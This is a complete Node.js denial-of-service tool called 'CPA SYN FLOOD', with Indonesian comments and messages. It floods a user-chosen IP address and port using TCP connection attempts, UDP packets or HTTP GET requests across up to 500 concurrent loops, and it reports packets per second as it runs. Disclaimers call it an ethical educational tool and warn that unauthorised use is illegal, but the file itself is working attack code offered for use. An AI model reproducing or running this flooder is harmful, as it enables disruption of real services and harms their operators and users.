#!/usr/bin/env node

// ========== DEPENDENCIES ==========
const dgram = require('dgram');
const net = require('net');
const { exec } = require('child_process');

// ========== KONFIGURASI ==========
let targetIP = '';
let targetPort = 80;
let threads = 100;
let isRunning = true;
let packetCount = 0;
let startTime = null;

// Warna untuk console
const colors = {
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m',
    reset: '\x1b[0m'
};

// ========== BANNER 2 BARIS ==========
const banner = `
${colors.red}╔══════════════════════════════════════════════════════════════╗${colors.reset}
${colors.red}║${colors.white}                    ██████╗██████╗  █████╗                     ${colors.red}║${colors.reset}
${colors.red}║${colors.white}                   ██╔════╝██╔══██╗██╔══██╗                    ${colors.red}║${colors.reset}
${colors.red}║${colors.cyan}                           ██████╔╝███████║                        ${colors.red}║${colors.reset}
${colors.red}║${colors.cyan}                           ╚═════╝ ╚══════╝                        ${colors.red}║${colors.reset}
${colors.red}╠══════════════════════════════════════════════════════════════╣${colors.reset}
${colors.red}║${colors.yellow}                           ${colors.white}${colors.bold}CPA SYN${colors.reset}${colors.yellow}                            ${colors.red}║${colors.reset}
${colors.red}║${colors.yellow}                           ${colors.white}${colors.bold}FLOOD${colors.reset}${colors.yellow}                             ${colors.red}║${colors.reset}
${colors.red}╚══════════════════════════════════════════════════════════════╝${colors.reset}
${colors.magenta}              🔥 Ethical Security Testing Tool 🔥${colors.reset}
${colors.red}         ⚠️  FOR EDUCATIONAL PURPOSES ONLY ⚠️${colors.reset}
`;

// ========== FUNGSI BANTUAN ==========
function log(message, type = 'info') {
    const timestamp = new Date().toLocaleTimeString();
    const icons = {
        info: '📡',
        success: '✅',
        error: '❌',
        warning: '⚠️',
        attack: '🔥'
    };
    
    let color = colors.cyan;
    if (type === 'success') color = colors.green;
    if (type === 'error') color = colors.red;
    if (type === 'warning') color = colors.yellow;
    if (type === 'attack') color = colors.magenta;
    
    console.log(`${color}[${timestamp}] ${icons[type]} ${message}${colors.reset}`);
}

function showStats() {
    if (!startTime) return;
    const elapsed = (Date.now() - startTime) / 1000;
    const pps = Math.floor(packetCount / elapsed);
    
    process.stdout.write(`\r${colors.yellow}📊 STATS: Packets: ${packetCount} | PPS: ${pps} | Duration: ${elapsed.toFixed(1)}s${colors.reset}`);
}

// ========== SERANGAN TCP SYN ==========
async function tcpSynFlood(threadId) {
    while (isRunning) {
        try {
            const socket = new net.Socket();
            socket.setTimeout(50);
            
            socket.on('error', (err) => {
                packetCount++;
                if (packetCount % 100 === 0) showStats();
            });
            
            socket.connect(targetPort, targetIP, () => {
                socket.destroy();
                packetCount++;
                if (packetCount % 100 === 0) showStats();
            });
            
            setTimeout(() => {
                try { socket.destroy(); } catch(e) {}
            }, 50);
            
            await new Promise(resolve => setTimeout(resolve, 1));
            
        } catch(err) {
            packetCount++;
        }
    }
}

// ========== SERANGAN UDP FLOOD ==========
async function udpFlood(threadId) {
    while (isRunning) {
        const client = dgram.createSocket('udp4');
        const payload = Buffer.alloc(1024, 'X');
        
        client.send(payload, targetPort, targetIP, (err) => {
            if (!err) packetCount++;
            client.close();
            if (packetCount % 100 === 0) showStats();
        });
        
        await new Promise(resolve => setTimeout(resolve, 1));
    }
}

// ========== SERANGAN HTTP REQUEST ==========
async function httpFlood(threadId) {
    while (isRunning) {
        const httpClient = net.createConnection(targetPort, targetIP, () => {
            const request = `GET / HTTP/1.1\r\nHost: ${targetIP}\r\nUser-Agent: CPA-Bot/${Math.random()}\r\nAccept: */*\r\nConnection: close\r\n\r\n`;
            httpClient.write(request);
            packetCount++;
            if (packetCount % 100 === 0) showStats();
        });
        
        httpClient.on('error', () => {});
        httpClient.setTimeout(100, () => httpClient.destroy());
        
        await new Promise(resolve => setTimeout(resolve, 10));
    }
}

// ========== CEK KONEKSI INTERNET ==========
function checkInternet() {
    return new Promise((resolve) => {
        exec('ping -c 1 8.8.8.8', (error) => {
            if (error) {
                log('Tidak ada koneksi internet!', 'error');
                resolve(false);
            } else {
                log('Koneksi internet aktif', 'success');
                resolve(true);
            }
        });
    });
}

// ========== CEK IP VALID ==========
function isValidIP(ip) {
    const ipRegex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    return ipRegex.test(ip);
}

// ========== MENAMPILKAN BANTUAN ==========
function showHelp() {
    console.log(`
${colors.yellow}╔════════════════════════════════════════════════════════════╗${colors.reset}
${colors.yellow}║                    CARA PENGGUNAAN                          ║${colors.reset}
${colors.yellow}╚════════════════════════════════════════════════════════════╝${colors.reset}

${colors.green}▶  Syntax:${colors.reset}
   node cpa_syn_flood.js [IP] [PORT] [THREADS] [METHOD]

${colors.green}▶  Parameter:${colors.reset}
   ${colors.cyan}IP${colors.reset}       - Target IP address (wajib)
   ${colors.cyan}PORT${colors.reset}     - Target port (default: 80)
   ${colors.cyan}THREADS${colors.reset}  - Jumlah threads (default: 100, max: 500)
   ${colors.cyan}METHOD${colors.reset}   - tcp, udp, atau http (default: tcp)

${colors.green}▶  Contoh:${colors.reset}
   ${colors.yellow}TCP SYN Flood:${colors.reset}
   node cpa_syn_flood.js 192.168.1.1 80 100 tcp
   
   ${colors.yellow}UDP Flood:${colors.reset}
   node cpa_syn_flood.js 10.0.0.1 53 50 udp
   
   ${colors.yellow}HTTP Flood:${colors.reset}
   node cpa_syn_flood.js 172.16.0.1 8080 200 http

${colors.green}▶  Informasi Sistem:${colors.reset}
   ${colors.cyan}Node Version:${colors.reset} ${process.version}
   ${colors.cyan}Platform:${colors.reset} ${process.platform}
   ${colors.cyan}Architecture:${colors.reset} ${process.arch}

${colors.red}╔════════════════════════════════════════════════════════════╗${colors.reset}
${colors.red}║  ⚠️  PERINGATAN PENTING ⚠️                                 ║${colors.reset}
${colors.red}║                                                            ║${colors.reset}
${colors.red}║  • Hanya untuk testing pada sistem milik sendiri!          ║${colors.reset}
${colors.red}║  • Penggunaan tanpa izin adalah tindakan ILEGAL!           ║${colors.reset}
${colors.red}║  • Penalti: UU ITE Pasal 30 & 46 (Penjara 12 tahun)        ║${colors.reset}
${colors.red}║  • Tool ini untuk pembelajaran protokol jaringan           ║${colors.reset}
${colors.red}╚════════════════════════════════════════════════════════════╝${colors.reset}
    `);
}

// ========== MAIN FUNCTION ==========
async function main() {
    console.clear();
    console.log(banner);
    
    // Parse arguments
    const args = process.argv.slice(2);
    
    if (args.length === 0 || args[0] === '--help' || args[0] === '-h') {
        showHelp();
        process.exit(0);
    }
    
    targetIP = args[0];
    targetPort = parseInt(args[1]) || 80;
    threads = parseInt(args[2]) || 100;
    const method = (args[3] || 'tcp').toLowerCase();
    
    // Validasi input
    if (!isValidIP(targetIP)) {
        log('IP address tidak valid!', 'error');
        console.log(`${colors.yellow}Contoh IP yang benar: 192.168.1.100${colors.reset}`);
        process.exit(1);
    }
    
    if (targetPort < 1 || targetPort > 65535) {
        log('Port harus antara 1-65535!', 'error');
        process.exit(1);
    }
    
    if (threads < 1 || threads > 500) {
        log('Threads harus antara 1-500!', 'error');
        process.exit(1);
    }
    
    // Cek koneksi
    const hasInternet = await checkInternet();
    if (!hasInternet) {
        log('Pastikan koneksi internet aktif!', 'error');
        process.exit(1);
    }
    
    // Tampilkan konfigurasi
    console.log(`\n${colors.yellow}┌─────────────────────────────────────────────┐${colors.reset}`);
    console.log(`${colors.yellow}│${colors.white}         TARGET CONFIGURATION               ${colors.yellow}│${colors.reset}`);
    console.log(`${colors.yellow}├─────────────────────────────────────────────┤${colors.reset}`);
    console.log(`${colors.yellow}│${colors.cyan}  Target IP   : ${colors.green}${targetIP}${colors.yellow}                         │${colors.reset}`);
    console.log(`${colors.yellow}│${colors.cyan}  Target Port : ${colors.green}${targetPort}${colors.yellow}                              │${colors.reset}`);
    console.log(`${colors.yellow}│${colors.cyan}  Threads     : ${colors.green}${threads}${colors.yellow}                                 │${colors.reset}`);
    console.log(`${colors.yellow}│${colors.cyan}  Method      : ${colors.green}${method.toUpperCase()}${colors.yellow}                                 │${colors.reset}`);
    console.log(`${colors.yellow}└─────────────────────────────────────────────┘${colors.reset}`);
    console.log('');
    
    log('⚠️  PERINGATAN: Hanya untuk testing legal!', 'warning');
    log('Serangan akan dimulai dalam 5 detik...', 'info');
    log('Tekan Ctrl+C kapan saja untuk menghentikan', 'info');
    
    // Countdown
    for (let i = 5; i > 0; i--) {
        process.stdout.write(`\r${colors.red}⏰ Memulai dalam ${i} detik...${colors.reset}`);
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    console.log('');
    
    startTime = Date.now();
    
    // Pilih metode serangan
    let attackFunction;
    let methodName = '';
    switch(method) {
        case 'udp':
            attackFunction = udpFlood;
            methodName = 'UDP Flood';
            break;
        case 'http':
            attackFunction = httpFlood;
            methodName = 'HTTP Flood';
            break;
        default:
            attackFunction = tcpSynFlood;
            methodName = 'TCP SYN Flood';
    }
    
    log(`🚀 Memulai ${methodName} attack ke ${targetIP}:${targetPort}`, 'attack');
    log(`⚡ Mengaktifkan ${threads} threads...`, 'info');
    console.log('');
    
    // Jalankan threads
    const promises = [];
    for (let i = 0; i < threads; i++) {
        promises.push(attackFunction(i));
    }
    
    // Monitor stats setiap detik
    const statsInterval = setInterval(() => {
        if (isRunning && startTime) {
            showStats();
        }
    }, 1000);
    
    // Handle Ctrl+C
    process.on('SIGINT', () => {
        console.log('\n');
        log('🛑 Menghentikan serangan...', 'warning');
        isRunning = false;
        clearInterval(statsInterval);
        
        if (startTime) {
            const elapsed = (Date.now() - startTime) / 1000;
            const avgPPS = Math.floor(packetCount / elapsed);
            
            console.log(`\n${colors.green}════════════════════════════════════════════════════════${colors.reset}`);
            log(`✅ SERANGAN DIHENTIKAN`, 'success');
            log(`📊 Total Paket Terkirim: ${packetCount.toLocaleString()}`, 'success');
            log(`⏱️  Durasi: ${elapsed.toFixed(2)} detik`, 'success');
            log(`⚡ Rata-rata PPS: ${avgPPS.toLocaleString()}`, 'success');
            console.log(`${colors.green}════════════════════════════════════════════════════════${colors.reset}`);
        }
        
        log('Terima kasih telah menggunakan CPA SYN FLOOD', 'info');
        setTimeout(() => process.exit(0), 1500);
    });
    
    // Auto stop setelah 60 detik (opsional)
    setTimeout(() => {
        if (isRunning) {
            console.log('\n');
            log('⏰ Durasi maksimum tercapai (60 detik), menghentikan...', 'warning');
            process.emit('SIGINT');
        }
    }, 60000);
    
    // Tunggu semua promise
    await Promise.all(promises);
}

// Run
if (require.main === module) {
    main().catch((err) => {
        log(`Error: ${err.message}`, 'error');
        process.exit(1);
    });
}

module.exports = { tcpSynFlood, udpFlood, httpFlood };
